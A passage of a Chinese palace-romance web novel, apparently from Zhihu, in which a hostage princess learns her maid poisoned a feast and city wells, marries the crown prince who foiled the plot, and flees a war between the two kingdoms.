雷从空中一道道直直地砸下。</p>\n<p>每落下一道惊雷，广袤无垠的大地上便是一个深坑，可怖得很。</p>\n<p>潜意识告诉我，那些天雷是冲我而来的。</p>\n<p>为什么？</p>\n<p>我做错了什么？</p>\n<p>这里是哪里？</p>\n<p>我向四周张望，才发现不远处，还有一个男人。</p>\n<p>他身上似乎带着很重的伤，但脸孔模糊不清，也不知道我到底认不认识。</p>\n<p>他是谁？</p>\n<p>是敌人，还是盟友，或是陌生人？</p>\n<p>我呆在原地，那个男人突然转过头，朝我大喊：“楼伽蓝！快跑！别回头！千万别回头！”</p>\n<p>“愣着干什么？笨死了！跑啊！跑！”</p>\n<p>也不知道是什么情况，听见这话，虽然还搞不清楚现在的状况，我赶紧跑了起来。</p>\n<p>没跑几步，就是一个踉跄，我倒在地上。</p>\n<p>身后似乎有热量袭来，我忘记了刚才那个男人的话，回头一看。</p>\n<p>一道带着电光的惊雷，直接贴到了我的眼前！</p>\n<p>“啊！”</p>\n<p>我直接被吓醒了。</p>\n<p>这才发现......原来只是梦。</p>\n<p>我的眼前，现在居然是瀛玉的脸。</p>\n<p>再一转眼，他的身边，还放着新鲜出炉的辣子鸡糖醋里脊蒜香扁豆银耳桂花羹……</p>\n<p>我还没从刚才的噩梦中缓过神来，盯着瀛玉那张好看的脸，张了张口，却什么也没说出来。</p>\n<p>“怎么不说话？”瀛玉哂笑一声。</p>\n<p>“看见我，高兴到连话都说不出来了？”</p>\n<p>我：“......”</p>\n<p>16.</p>\n<p>我又深呼吸了几口，终于缓过了神，从榻上坐了起来：“不是，刚刚做噩梦了。”</p>\n<p>“瀛玉，你总是来无影去无踪的，平日里是不是仗着自己武功了得，都爱好随随便便进女孩子的房间？”我眯起眼睛。</p>\n<p>瀛玉皱起眉：“笨死了，我会那么无聊？我做的都是正经事。”</p>\n<p>“那你来干什么？”我眼睛往旁边一瞥：“还带这么多好吃的。”</p>\n<p>有一说一，瀛玉这句“笨死了”，跟我梦里那个男子的声音，倒是有几分相似。</p>\n<p>“昨天看你喝多了，今早担心你健康，就过来看看。”</p>\n<p>“这些吃的也都是随便拿的，看你在上回皇兄生日宴上很喜欢吃这些，就拿了些来。”</p>\n<p>“如果没什么事儿，我就先走了。”</p>\n<p>“欸，等等。”我可能是还有点没睡醒，竟直接去拉了他的袖子。</p>\n<p>瀛玉一挑眉，我连忙松开手，脸有点红扑扑的：“不是，我就想谢谢你，昨天送我回来。”</p>\n<p>“不客气，举手之劳。”瀛玉顿了顿：“就是下次，千万别跟不熟悉的人喝酒。”</p>\n<p>“为什么？”</p>\n<p>瀛玉“啧”了一声：“笨。你酒量差，一喝醉就乱说胡话，让别人听了，影响实在不太好。”</p>\n<p>我嘴角抽搐了一下，心里不知怎的有一种不好的预感：“我说什么了？”</p>\n<p>“我复述出来的话，会很奇怪。”瀛玉看了我一眼：</p>\n<p>“起来赶紧吃点东西，我等会还得去找父皇一趟。”</p>\n<p>“你要主动去找皇上？不会......不会被赶出来吗。”</p>\n<p>我话说到后面有点虚。</p>\n<p>瀛玉：“......我走了。”</p>\n<p>后面的几天，瀛玉居然经常出没于皇宫之中。</p>\n<p>父子俩是要和好了么？</p>\n<p>我很惊讶，同时又很为瀛玉开心。</p>\n<p>毕竟，他的太子之位被废，本就是不该的。</p>\n<p>刍荆的皇帝深爱妻子，本是美好之事，不该由瀛玉来承担本不该属于他的痛苦。</p>\n<p>偶尔，我又会听见疏桐说，二皇子跟皇上今天又大吵一架。</p>\n<p>唉，真是对他没辙了，有什么话不能好好说呢？</p>\n<p>不过近日，我总会睡前在枕头下面，发现几样新奇的小玩意儿。</p>\n<p>能做出这种事的，除了瀛玉，也没谁了。</p>\n<p>他就这么爱进女孩子的屋？</p>\n<p>无聊死了。</p>\n<p>不过他带来的小东西，倒是挺好玩的，就暂且原谅他啦。</p>\n<p>17.</p>\n<p>这天晚上，我的窗前，落了一只鸽子。</p>\n<p>是疏桐发现的，她急匆匆地将鸽子拿到我手里：</p>\n<p>“公主，楼岚国的信，总算来了。”</p>\n<p>我满脑子都是今晚有乳鸽吃，听见疏桐的话，有些没懂：</p>\n<p>“什么叫做，总算来了？”</p>\n<p>疏桐眼神有些飘忽：“一直没跟公主说起这件事，皇上让我在收到回信之前，都千万不要将此事告知公主。”</p>\n<p>“其实咱们来刍荆，是有要事在身的。”</p>\n<p>“什么意思？”</p>\n<p>我心中隐隐有些不安。</p>\n<p>“自从我们来到刍荆国，我每周都会向楼岚传信，我早在中秋宴上就给玉蝶酥下过慢性药，在座的皇子公主都即将不久于人世。”</p>\n<p>“解药我早就混在日常饭食里为公主服下，公主尽管放心，您的身体安康。”</p>\n<p>“届时刍荆国大乱，我们便可乘乱逃跑，会有楼岚的人来接应我们。”</p>\n<p>我怎么也没想到，跟着我这么多年的丫头，居然是个行动如此神不知鬼不觉的间谍？</p>\n<p>看她每天睡得香喷喷的，怎么背后做了这么多事？</p>\n<p>我突然有些怕她。</p>\n<p>“你是说......参加了中秋宴上，所有的人？”</p>\n<p>疏桐握住我的手：</p>\n<p>“公主，你傻呀！我们到底是楼岚的人！”</p>\n<p>“你想想，这么多年，皇上都不看重我们，我们总得做点什么，才能往上爬，让那些曾经看不起我们的人后悔！”</p>\n<p>“这不是公主您一直想要的吗？”</p>\n<p>“可......可是......”</p>\n<p>我有些迷茫了：“可是刍荆的人他们没有做错什么啊，瀛季人很好的，他的妻子好温柔啊，瀛小妹妹我们不是总跟她一起玩的么，还有......”</p>\n<p>还有......还有瀛玉呢。</p>\n<p>瀛玉？</p>\n<p>我突然想到，瀛玉大概是没有事的。</p>\n<p>他没有参加中秋宴，不知道他那天跑哪儿去了。</p>\n<p>“九公主！楼伽蓝！”</p>\n<p>疏桐情急之下居然喊了我的名字，我被她吓了一跳。</p>\n<p>疏桐在我身前跪了下来：</p>\n<p>“公主若还记得自己是哪里的人，便莫要心软。这事既然已经做下了，那若是被发现，疏桐与公主，皆免不了一死，公主可要想清楚。”</p>\n<p>我沉默了。</p>\n<p>“公主，疏桐想做出点东西，让他们看看，我们不该被小看。”</p>\n<p>疏桐又给我磕了一个头：</p>\n<p>“求求公主了。”</p>\n<p>我叹了一口气：“你下去吧。”</p>\n<p>“公主......下个月初，刍荆的人身体内的毒就都会......”</p>\n<p>“我让你下去！”我加重了语气。</p>\n<p>“......是。”</p>\n<p>18.</p>\n<p>疏桐一走，我便坐在榻上哭了起来。</p>\n<p>怎么办？</p>\n<p>我到底该怎么办？</p>\n<p>说出去是我死，不说的话就是他们死。</p>\n<p>我才来了从桂花还没开时来到刍荆，就感受到了周围人许多的关爱。</p>\n<p>刍荆的皇子公主，他们之间的亲和友爱，是我从未触及过的美好。</p>\n<p>这是我十六年来都如此想要的东西，好不容易得到了，桂花都还没有到凋谢的时令，就这么快就又要失去这些吗？</p>\n<p>我......不想这样。</p>\n<p>突然一道男生横插进来：“这是怎么了？哭了？嗯？”</p>\n<p>我一惊，抬头，瀛玉却已经从窗户翻了进来。</p>\n<p>瀛玉见到我哭肿的眼睛，好看的眉眼蹙了起来：</p>\n<p>“怎么眼睛红成这样，真跟只小兔子一样了。”</p>\n<p>“楼伽蓝，告诉我，到底怎么回事？”</p>\n<p>他逆着月色，微光将他周身镀上了一层柔软，让瀛玉整个人都看起来温柔极致。</p>\n<p>那双桃花眼此刻满是缱绻，但若是我告诉他，不出半月，他的兄弟姐妹就都要死了，他会不会现在就杀了我？</p>\n<p>虽然不想承认，但大概是会的。</p>\n<p>我与瀛玉之间的羁绊，说浅不浅，说深不深。</p>\n<p>但不知不觉间，我也不知道是为什么，从什么时候开始的。</p>\n<p>他似乎变成了在我身边，令我依赖感最强的人了。</p>\n<p>“不想说？”瀛玉摸了一把我的脑袋。</p>\n<p>“有点想......但又有点不想。”</p>\n<p>“没准备好那就不说了。”瀛玉很轻地笑了一声：“对了，之前给你送的小玩意儿，都收到了？”</p>\n<p>“嗯。”我点点头。</p>\n<p>“不回个礼给我？”</p>\n<p>“啊？”我低下声音：“你这个人怎么这样，还反过来主动要东西的。”</p>\n<p>“不可以吗？”</p>\n<p>“也不是不可以。”我琢磨了一下，起身从柜子里找出一个小盒子递给他。</p>\n<p>“我先前闲的没事，在楼岚的时候自己雕了一个玉佩，虽然粗糙了点，但也还不错。”</p>\n<p>我咬了咬下唇：“你若不嫌弃，那就拿去。”</p>\n<p>瀛玉打开木盒的盖子，取出那一枚小小的白色玉佩。</p>\n<p>“这么好的东西，为何不要？”瀛玉手腕一收，将那玉佩攥进手心：“我收下了。”</p>\n<p>19.</p>\n<p>就在那一刻。</p>\n<p>真的就是那么一瞬间，我突然觉得，可能自己的选择，早就已经明了了。</p>\n<p>只是我还在虚假地与自己作斗争，用死亡的威胁去试图劝阻自己。</p>\n<p>楼岚，真的值得我和疏桐，为它做这些吗？</p>\n<p>根本不值得的。</p>\n<p>“瀛玉。”</p>\n<p>“我在。”</p>\n<p>我叹了口气：“带我去摘月轩吧，我跟你说件事。”</p>\n<p>瀛玉点头，朝我伸出手。</p>\n<p>我赶紧后退一步：“你干嘛！”</p>\n<p>“带你走啊，不然呢？”瀛玉的眼神又开始嫌弃了：“你要自己用腿走过去？那得多久。”</p>\n<p>我吐了一口气：“我还以为你现在就要杀了我。”</p>\n<p>瀛玉被我气笑了：“你在想什么呢？我平白无故杀你作甚？”</p>\n<p>我不去看他：</p>\n<p>“等会我说了，你可能就想杀我了。”</p>\n<p>瀛玉将我抱起，往外一跃。</p>\n<p>“那也得等你说了，我再考虑。”</p>\n<p>瀛玉轻功了得，我第一次如此近距离地感受。</p>\n<p>切身体会四个字，今天我才知道原来是这种感觉。</p>\n<p>瀛玉的胸口那样温热，他的脸离我那样近。</p>\n<p>他真的好好看啊，我真遗憾没能见到刍荆的先皇后长得是什么模样。</p>\n<p>一定是如天仙一般吧，跟我之前梦里的女子，一定是不相上下的，或者更胜一筹。</p>\n<p>否则，瀛玉怎么能生得如此好看？</p>\n<p>我承认，我动心了。</p>\n<p>只是很可惜。</p>\n<p>这份动心才刚刚开始，便要强制性地结束。</p>\n<p>20.</p>\n<p>“到底要说什么？”</p>\n<p>我才刚开了个头，说了两个字，眼泪看着就要往下掉。</p>\n<p>瀛玉捕捉到我的眼神，皱起眉似乎想给我擦眼泪，我在他伸手之前强行将眼泪憋了回去。</p>\n<p>“瀛玉，你赶紧告诉你父皇还有兄弟姐妹，他们都中毒了。”</p>\n<p>“中秋夜宴上，疏桐......疏桐她......我先在这里替她道歉，总之是要面对的。”</p>\n<p>“疏桐在玉蝶酥上下了楼岚特制的毒药，要过很久才会发作，现在去找解药还来得及！”</p>\n<p>我说完了，瀛玉却并没有像我想象当中一样，露出很凝重的表情，或者是急急忙忙地离开。</p>\n<p>他就这么看着我：“说完了？”</p>\n<p>我呆呆地点头：“你怎么还不走？”</p>\n<p>这不会是传说中，暴风雨前的宁静吧？</p>\n<p>我叹了一口气：“还是说，你想先杀了我？”</p>\n<p>“说什么呢，笨死了。”瀛玉叹了一口气：“我说你，刚知道么？”</p>\n<p>我迟疑了一下，点了点头：“对不起。”</p>\n<p>“你有什么对不起的？又不是你做的。”</p>\n<p>瀛玉揉了一把我的脑袋：“你知道是中秋夜宴为什么没来么？”</p>\n<p>“啊？”我有点不明白了，瀛玉没事儿扯这个干什么？</p>\n<p>“在中秋宴之前，我其实一直对你和疏桐抱有很深的揣测。”</p>\n<p>“我......”说实话，我完全没看出来。</p>\n<p>“是不是想说没看出来？那肯定啊，要是怀疑你们还能被你看出来，我白长这么大了？”</p>\n<p>瀛玉失笑：“后来与你的接触，我彻底确定了，疏桐和你，在楼岚那边，完全是不同的角色。”</p>\n<p>这下已经说得明显地不能再明显了，我瞪大眼睛：“你早就知道疏桐有问题？不是，你怎么看出来的？我和她认识好多年了，都没看出来她的不同！”</p>\n<p>“笨的你。”瀛玉又骂我，可我却绝对他说话好温柔。</p>\n<p>“那玉蝶酥......”</p>\n<p>瀛玉笑笑：“中秋宴那天，我去换掉了疏桐房中的药。”</p>\n<p>“至于怎么处置她.......我可以为了你原谅她，只要她保证不再犯，并且想办法联系楼岚，告知他们计划失败了。”</p>\n<p>“所以辟个谣，我不是爱偷偷进女孩子的房间。”</p>\n<p>“只是为了查探你们的底细，所以那段时间，我经常来。”</p>\n<p>“主要是去看疏桐的房间，你的房间......我只是想见你。”</p>\n<p>“放心吧，我们都没事，不会有人死的。”</p>\n<p>瀛玉托着我的脸，将眼角的泪轻轻拂去。</p>\n<p>“别哭了，都红成兔子眼了，笨不笨啊你。”</p>\n<p>21.</p>\n<p>我百思不得其解。</p>\n<p>“瀛玉，你为什么这么做？我值得你这么做吗？”</p>\n<p>“笨死了，真是的。”</p>\n<p>瀛玉有些恨铁不成钢地看着我：</p>\n<p>“动动你那兔子都不如的脑袋，好好想一想，我对你这么好，还能是因为什么？”</p>\n<p>“因为......因为什么啊？”</p>\n<p>我一头雾水。</p>\n<p>瀛玉俯下身，一双桃花眼直勾勾地盯着我。、</p>\n<p>我刚想往后退，就被他一把扶住背部，往自己身上靠：</p>\n<p>“当心点，在屋顶呢，别摔下去。”</p>\n<p>“我之前不是说了么，你这么蠢，要是不靠和亲，估计也没人要你。”</p>\n<p>“你本就注定该是我的妻，我一早便认定了你，怎会将你放跑？”</p>\n<p>“既然你想做皇后，我便跟父皇主动去要了个太子当当。”</p>\n<p>“过程......不说了，不太顺利，但现在算是能定下了。”</p>\n<p>“虽然被我父皇骂得狗血淋头，但现在看见你，觉得倒也挺值得，简直是赚大发了。”</p>\n<p>“我皇兄也不想当皇帝，这苦差事，我们兄弟似乎都不太爱接。”</p>\n<p>“不过既然我的小兔子喜欢，那我还是就勉为其难，当一当太子吧。”</p>\n<p>“明日，圣旨一出，我这太子就能做回来了。”</p>\n<p>“唉，你能不能别哭了？你哭起来也挺好看的，但笑起来更可爱啊。”</p>\n<p>“楼伽蓝，你冲我笑一笑，行不行？你好像没怎么对我笑过。”</p>\n<p>我努力朝他挤出一个笑来。</p>\n<p>遭到了瀛玉满脸嫌弃：“这么勉强，算了算了，你哭吧。”</p>\n<p>我的脸立马拉了下去，瀛玉失笑，又捏了捏我的脸。</p>\n<p>“言归正传了啊。”</p>\n<p>“所以，我现在要问问你。”</p>\n<p>“楼伽蓝，这个太子妃的位置，你有没有兴趣？”</p>\n<p>瀛玉笑着对我说。</p>\n<p>那一刻我还以为是梦。</p>\n<hr>\n<h3>22.</h3>\n<p>第二天，圣旨就下来了。</p>\n<p>听说瀛玉连跪都没跪，太监还在读旨意呢，他顺手就将对方手里的卷宗一抽，直接朝我的宫殿方向去。</p>\n<p>他前脚刚到我的寝殿大堂，后脚赐婚的旨意也就到了。</p>\n<p>我连忙跪下，瀛玉这回也同我一起跪下来。</p>\n<p>“奉天承运，皇帝诏曰。”</p>\n<p>“刍荆国太子瀛玉，才貌双绝，谨遵礼法；楼岚国九公主楼迦蓝，蕙质兰心，国色天香。”</p>\n<p>我心道：真能吹。</p>\n<p>悄悄偏头看一眼瀛玉，后者似乎也在憋笑。</p>\n<p>“才子佳人，确为良配。”</p>\n<p>“皇上今日即为太子和九公主赐婚，预祝太子与太子妃和和美美，百年好合。”</p>\n<p>“——钦此！”</p>\n<p>我刚收回目光，手背上便触碰到一片温热。</p>\n<p>是瀛玉握住了我的手。</p>\n<p>然后，他牵着我，站直了身体。</p>\n<p>这是我第一次站着接过圣旨。</p>\n<p>刍荆国可以这样的吗？</p>\n<p>看那传话太监的表情，大概不是的。</p>\n<p>只有刍荆国太子敢这么嚣张。</p>\n<p>现在还要带着他的太子妃，一起目无尊法。</p>\n<p>刚刚还读的“谨遵礼法”呢？</p>\n<p>果然就是皇帝写着玩儿的吧。</p>\n<p>我来的时候，以为我要当着这个质子好多年，等他们那总角之年的皇弟再长两岁，然后履行我和亲的义务。</p>\n<p>谁能想到呢？</p>\n<p>我一个哪哪儿都不行，处处不受宠的公主，作为质子押在异国他乡，到头来，有一天却突然要做他们的太子妃。</p>\n<p>大抵，从我出生到现在，所有的运气都用来遇见瀛玉了吧。</p>\n<p>23.</p>\n<p>大婚之夜。</p>\n<p>我披着红盖头，心算着传信的大概已经到了楼岚国。</p>\n<p>今日还不到寅时，我就被疏桐拉着起床了。</p>\n<p>看来无论怎么样，成亲的规矩都是多的，况且还是本国太子的婚礼。</p>\n<p>怎么这么久还不来？</p>\n<p>等得久了，我都有点昏昏欲睡了起来，头像小鸡啄米似的一点，再一点。</p>\n<p>“咔沓。”</p>\n<p>我隐约听到门外疏桐问好的声音，门帘被掀起来的一瞬间，上面的珠子相互碰撞，发出清脆的响声。</p>\n<p>是瀛玉。</p>\n<p>我眼前还是红红的一片，只隐隐约约看得清瀛玉的轮廓。</p>\n<p>还没回过神，瀛玉的手已经伸进红盖头，轻轻地一抬。</p>\n<p>他的脸，在我眼前渐渐清晰。</p>\n<p>瀛玉轻笑一声：“楼迦蓝，你这人怎么这样，等我也能等得困么？”</p>\n<p>“我寅时就被疏桐拉起来了，这个头冠太沉了，压得我困。”</p>\n<p>我噘着嘴跟他争辩。</p>\n<p>“嗯，我要再早一点。”</p>\n<p>“你起那么早干什么？”我不理解。</p>\n<p>瀛玉的嘴角带了点暧昧的笑意，他说：“我兴奋地根本没睡。”</p>\n<p>我：“……”</p>\n<p>瀛玉笑着在我身边坐下，抬起细长的手指，一点一点帮我将头顶的发饰取下来。</p>\n<p>他动作很慢，我哪怕是皱一点眉头，他都能发现，然后问是不是他揪到我头发了。</p>\n<p>发钗尽数被拿了下来，青丝散落在床上，还有我的身上。</p>\n<p>瀛玉抬手伸向扣子的时候，我下意识地脱口而出：“你干嘛？”</p>\n<p>瀛玉这回看我的目光，比以往任何一次，都要意味深长。</p>\n<p>“你说呢？”瀛玉低笑：“太子妃？”</p>\n<p>我脸一红，才发现刚刚那句属实像个笨蛋。</p>\n<p>红帐纱幔摇晃，烛火灭了一茬。</p>\n<p>瀛玉的手碰到我脖颈的那一刻，我条件反射地往后缩了缩。</p>\n<p>“别怕。”</p>\n<p>他的唇覆上来，一开始我全身僵硬，到后面竟也放松下来。</p>\n<p>“没事，阿蓝。”瀛玉在我耳边厮磨：“疼就喊出来。”</p>\n<p>“唔......不是......”</p>\n<p>“不疼？”</p>\n<p>我抽噎着：“疼。”</p>\n<p>“可以叫。”</p>\n<p>“我能忍着......”</p>\n<p>“那，舒服也喊出来，阿蓝，我想听。”</p>\n<p>我：“......”</p>\n<p>“脸这么红？”瀛玉在我耳边喘气。</p>\n<p>“竟有这么累么？”</p>\n<p>我想让他闭嘴！</p>\n<p>这人怎么床上话那么多？</p>\n<p>瀛玉的脸与我近在咫尺。</p>\n<p>可我就算是想打他，也早就没了力气。</p>\n<p>一夜春宵，再醒来已是日上三竿，疏桐悄悄推开门，见我醒了，喜上眉梢。</p>\n<p>“公主......太子妃醒了？太子去请安了，说让您睡到自然醒，身子累就不用去给皇上请安了，反正也就是走个形式，刍荆不太在意这个。”</p>\n<p>“太子还说，皇上亲口说让太子妃好好休息，这不，大堂里已经全是御赐的补品了！”</p>\n<p>我纳闷：这成个亲，怎么像是要准备坐月子一般......</p>\n<p>“哎呀，话说多了，疏桐这就去给公主打热水来！”</p>\n<p>疏桐一拍手，连忙转身跑走。</p>\n<p>我撑着手臂，强行坐起来，腰酸背痛。</p>\n<p>嘶，头疼，腿麻。</p>\n<p>瀛玉到底是什么做的，一次又一次地不停......</p>\n<p>再一看，我身上的红痕哪里都是。</p>\n<p>拿铜镜一照——</p>\n<p>我自己都看不下去了。</p>\n<p>瀛玉这还让我怎么见人？</p>\n<p>气死我啦！</p>\n<p>24.</p>\n<p>成亲之后，我才知道，刍荆居然有这么多只有皇子知道的密道。</p>\n<p>瀛玉的房间也有一个小小的密室，以备情急之需。</p>\n<p>可是安乐日子没过几天，刍荆突然迎来了一场规模不小的瘟疫，说是有好几十位居民，在昨日突然暴毙了。</p>\n<p>瀛玉不让我出门，自己在外面跑来跑去，三天过去了，终于才回了一次宫。</p>\n<p>但也只是陪了我一小会，让我不要担心，然后又急急忙忙地再跑出去。</p>\n<p>听把守在门口的侍卫说，现在进出城门十分森严，才只三天，城门外已经死了上千百姓，怨声已经载道。</p>\n<p>我叹了口气，真是一波未平，一波又起。</p>\n<p>“也不知道是怎么流传的，至今没查出是城中哪里有问题，城外面又太空旷，无处可查。”</p>\n<p>侍卫这么对我说道。</p>\n<p>“确定不是城内的原因？”</p>\n<p>“应该不会，咱们刍荆城内的东西都是经过严格审查的，只有可能谁从城外带了不干净的东西回来吧？”</p>\n<p>我突然想到一件事。</p>\n<p>小时候我们在楼岚，曾经也经历过一次瘟疫。</p>\n<p>当时，是有敌国间谍将死蝙蝠丢进了酒里。</p>\n<p>酒......水......城内......城外......</p>\n<p>我猛地向寝殿内跑去。</p>\n<p>“疏桐！出来！”</p>\n<p>“现在就过来！我有话要问你！”</p>\n<p>其他的侍女看见我的样子，都吓了一大跳，静默着不敢说话。</p>\n<p>突然，就在这时，宫外响起沉重的号角声。</p>\n<p>几乎只是片刻之间，屋外突然一声巨响。</p>\n<p>“砰！”地一声，将整座刍荆国惊醒。</p>\n<p>“全城戒备！有敌袭——”</p>\n<p>我愣在原地，满脸惊恐。</p>\n<p>楼岚来攻刍荆了？</p>\n<p>不可能，不可能的啊！</p>\n<p>他们明明已经被疏桐通知过，计划失败，不可能攻城！</p>\n<p>还是说......还有什么我不知道的事？</p>\n<p>我万万没能想到，楼岚居然急不可耐成这样！</p>\n<p>是我猜的那样吗......</p>\n<p>可是，他们明明知道，我才刚和瀛玉成了亲！我才成了亲啊！</p>\n<p>如果刍荆真的灭了，楼岚国要我怎么办？</p>\n<p>我怎么办？</p>\n<p>25.</p>\n<p>我迅速推开房门，疏桐却已经跪在中央。</p>\n<p>“真的是你？”我的声音颤抖着：“疏桐，我待你从来不薄，你是不是疯了！”</p>\n<p>疏桐摇摇头：“疏桐知错了，可这些......是早在之前就下的。”</p>\n<p>我才知道，原来疏桐不止给中秋宴上的人下了毒。</p>\n<p>早在更早之前，她那些从楼岚带来的药还没有被瀛玉换掉时，疏桐已经在出宫采买的路上，在城外的野井中多次下过药。</p>\n<p>刍荆国不像楼兰国，不许野乞入城，而是采取开放的制度，尽可能地接纳无家可归之人。</p>\n<p>乞丐喝了外面的井水，再进入刍荆......</p>\n<p>病发，只是时间问题。</p>\n<p>它就像一座活火山，迟早会有爆炸的一天。</p>\n<p>“公主......”疏桐这次没叫我太子妃。</p>\n<p>“信我，来不及了。”</p>\n<p>“太子发现我的事情时，我就知道，无论杀我与不杀，刍荆都是要死很多人的。”</p>\n<p>“楼岚太想灭刍荆了，他们一定会发起这场战争的，公主，我们没有办法阻止。”</p>\n<p>战火四起。</p>\n<p>我相信这个时候，但凡有点脑子的，也应该想得出这个毒是谁下的了。</p>\n<p>瀛玉......应该会很失望吧。</p>\n<p>疏桐拉着我的衣角，眼泪从她眼角落下来。</p>\n<p>“公主！他们现在肯定已经知道了毒的源头是楼岚！我们赶紧先藏起来！”</p>\n<p>我甩开她：“我要等瀛玉！”</p>\n<p>疏桐哭起来：“您还要等什么啊？他先是刍荆的太子，而后才是你的丈夫！他怎么可能一而再再而三地保护敌国的人，公主，您是不是傻啊！”</p>\n<p>“家国面前，爱人又有何轻重！”</p>\n<p>“现在我们只能想办法自保，刍荆已经死了很多人，楼岚已经打进来了，刍荆迟早要灭！”</p>\n<p>“他杀你还来不及！”</p>\n<p>“现在太子一定已经去前线打仗了，杀也好，救也好，哪来的时间管咱们！”</p>\n<p>我浑身发冷，疏桐拉起还在发呆的我，一起藏进了瀛玉告诉过我们的密室里。</p>\n<p>26.</p>\n<p>密室内，还能听得见外面一些声响。</p>\n<p>果然有卫兵来找我们，说这楼岚国的公主到底是去哪儿了，还想抓起来得皇帝的赏赐呢。</p>\n<p>我们在狭小的密室里，躲了三天三夜。</p>\n<p>然后，食物和水都耗尽了。</p>\n<p>我们必须得出去了。</p>\n<p>夜深人静之时，我们悄悄将门打开，却惊动了侍卫。</p>\n<p>“九公主，保护好自己，我们在原来住的地方汇合！”</p>\n<p>疏桐说完这句话，立即朝另一个方向跑。</p>\n<p>我在惊呼出声的前一刻，捂住了嘴巴。</p>\n<p>我知道事关紧急不能再纠结，也决不能白白浪费疏桐为我争取的时间。</p>\n<p>通过之前瀛玉说过的密道，我跑了好久，终于才到了我刚来刍荆时的住处。</p>\n<p>我找到了一些食物和水，吃了几口后，实在撑不住，便昏睡了过去。</p>\n<p>醒来时，大堂内一片金碧辉煌，却没了生气。</p>\n<p>我偏过头，看见了铜镜里的自己。</p>\n<p>有那么一个瞬间，我觉得自己在镜子里有些奇怪。</p>\n<p>可是说不上来是哪里。</p>\n<p>仔细看，是很漂亮，也很破碎的一张脸。</p>\n<p>脸上有些脏了，我才发现已经几天没有洗过脸。</p>\n<p>这个环境，好像有些似曾相识......</p>\n<p>是梦里梦到过吗？</p>\n<p>好像又没有。</p>\n<p>这时，屋外似乎有走路声。</p>\n<p>我的心提到了嗓子眼，可我发现得太晚，已经没有时间再去藏身。</p>\n<p>终于，我看清了来人。</p>\n<p>他似乎很疲惫，脸上也沾着些血迹。</p>\n<p>外面还在打仗，他怎么脸盔甲都没有？</p>\n<p>还好身上没什么血迹，应该没受伤吧，他武功那么好。</p>\n<p>他逆着天光，手上的一柄长剑一侧已经被血染红。</p>\n<p>剑柄末尾，还挂着一枚白色的玉佩。</p>\n<p>瀛玉看见我，如释重负地松了一口气。</p>\n<p>“担心死了，还好找到了。”</p>\n<p>然后，他向我伸出手。</p>\n<p>“楼伽蓝。”</p>\n<p>“我来接你了。”</p>\n<p>【除了 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/11fff90d0571031c890c78d61e840710\" data-hash=\"11fff90d0571031c890c78d61e840710\" data-hovercard=\"p$b$11fff90d0571031c890c78d61e840710\">@阿洛</a> 的谢邀，还要感谢 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/20fb7fb2cead6efbe85f5caad3ec3a9c\" data-hash=\"20fb7fb2cead6efbe85f5caad3ec3a9c\" data-hovercard=\"p$b$20fb7fb2cead6efbe85f5caad3ec3a9c\">@是吖浩哇</a> 的邀请！超级蟹蟹！阿郁真的好开心！】</p>\n<p>【好啦，这篇是个神话文，前世轮回即将结束，回到现世~】</p>\n<hr>\n<h3>27.</h3>\n<p>我的眼泪像是流不尽，一见到他，所有的委屈都铺天盖地地袭来。</p>\n<p>瀛玉抚摸着我的发顶：“没事了，我们快走。”</p>\n<p>“等，等等！”我才想起来，疏桐还没有来：“我要再等等疏桐。”</p>\n<p>瀛玉皱起眉：“等她？我们来不及。”</p>\n<p>“不行！就......再等一会，就一会！一个时辰？”</p>\n<p>虽然疏桐大错特错，的确应该得到惩罚。</p>\n<p>可她还是救了我，不该就直接被弃之不顾。</p>\n<p>瀛玉的眉头依然蹙着，最后他淡淡地开口：</p>\n<p>“半个时辰，最多。”</p>\n<p>“好！”</p>\n<p>半个时辰过得很快，还好，疏桐终于回来了。</p>\n<p>她带了一身的伤，还说自己没事。</p>\n<p>瀛玉不放心地看了疏桐一眼，一块儿把我们送到了他以前的寝殿，嘱咐我们千万不要出去。</p>\n<p>我悄悄地问瀛玉：“一切结束了之后，疏桐的命，还能保下来吗？”</p>\n<p>瀛玉不说话。</p>\n<p>我知道，应该是不行了。</p>\n<p>而且，如今最大的事情，是战争的结局，还不知道会是谁赢谁输。</p>\n<p>若是楼岚赢了，疏桐的命应该还能保住。</p>\n<p>可是，楼岚若是赢了，整个刍荆......</p>\n<p>我身为楼岚九公主，却根本没法站在我的母国这一边。</p>\n<p>他们，真的错得太多了。</p>\n<p>“瀛玉。”我闭上眼睛：“对不起。”</p>\n<p>“你又没做错什么，不用跟我说对不起。”</p>\n<p>瀛玉叹了口气：“我再派个心腹跟着你们，我要走了。”</p>\n<p>“不用了，所有的武力，都要集中在前线。”</p>\n<p>我看着远方的战火，一字一顿。</p>\n<p>“瀛玉，一定要赢下这场仗啊。”</p>\n<p>他握着我的手，在我唇边轻轻落下一吻。</p>\n<p>“好，阿蓝。”</p>\n<p>“你要好好地，等我回来。”</p>\n<p>28.</p>\n<p>瀛玉走后，我便睡着了。</p>\n<p>不过我觉得这一觉，很不对劲。</p>\n<p>好像是睡了很久才起来，并且醒的时候，还睁不开眼睛。</p>\n<p>当我终于睁开眼，映入眼帘的是我房间的那副字画时，我就懂了。</p>\n<p>没错，我的房间。</p>\n<p>我在楼岚时，那个房间。</p>\n<p>我回来了。</p>\n<p>“啪塔！”</p>\n<p>我抬眼看去，门口疏桐手中的玉蝶酥落了一地。</p>\n<p>“出去。”</p>\n<p>在疏桐开口之前，我便下了逐客令。</p>\n<p>“公主，我下辈子再给您做牛做马，行吗。”</p>\n<p>“滚。”</p>\n<p>疏桐跪在地上给我磕头，每一下都很重.</p>\n<p>很快，她的额头上便有了很深的血坑，皮开肉绽。</p>\n<p>“我真的还不想死啊，我不想死!对不起！公主！”疏桐哭着，求我原谅。</p>\n<p>“无论刍荆被不被灭，公主您都不会有性命危险，可是刍荆一旦赢了，疏桐必死无疑！”</p>\n<p>“太子是不会放过我的！公主！疏桐跟您那么久，您体贴体贴疏桐这一次吧！”</p>\n<p>我别过脸去.</p>\n<p>“别拿你这个样子恶心我。”</p>\n<p>疏桐那天晚回来与我汇合，是因为遇见了楼岚的对接人。</p>\n<p>他们在瘟疫开始之前，早就伪装乞丐混进了刍荆。</p>\n<p>疏桐是没错的。</p>\n<p>求生是人的本能，若是一直留在刍荆，她只有一死。</p>\n<p>但若是回了楼岚，她还有一线生机。</p>\n<p>可我怎么原谅她？</p>\n<p>不可能啊。</p>\n<p>我最后让她以后不要再出现在我的眼前了。</p>\n<p>一天之后，一个面生的丫头进到我房间，朝我行了个礼。</p>\n<p>